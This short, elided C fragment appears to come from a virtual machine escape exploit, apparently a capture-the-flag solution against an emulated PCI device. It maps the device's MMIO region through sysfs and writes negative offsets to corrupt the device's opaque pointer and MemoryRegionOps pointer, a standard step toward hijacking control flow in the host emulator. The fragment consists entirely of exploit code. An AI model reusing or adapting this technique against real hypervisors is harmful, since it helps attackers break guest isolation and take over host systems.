...
{
	int fd;
    if((fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC)) == -1) {
	...
	mmio_write(MMIO_SET_OFFSET,(opaque-buffer)&((1UL << 32) - 1UL)); // write 32 bit
    mmio_write(MMIO_SET_OFFSET+4,-1);
    mmio_write(MMIO_SET_DATA,3893363);
	// 0x1160940
    mmio_write(MMIO_SET_OFFSET,(MemoryRegionOps_pointer-buffer)&((1UL << 32) - 1UL)); // write 32 bit
    mmio_write(MMIO_SET_OFFSET+4,-1);
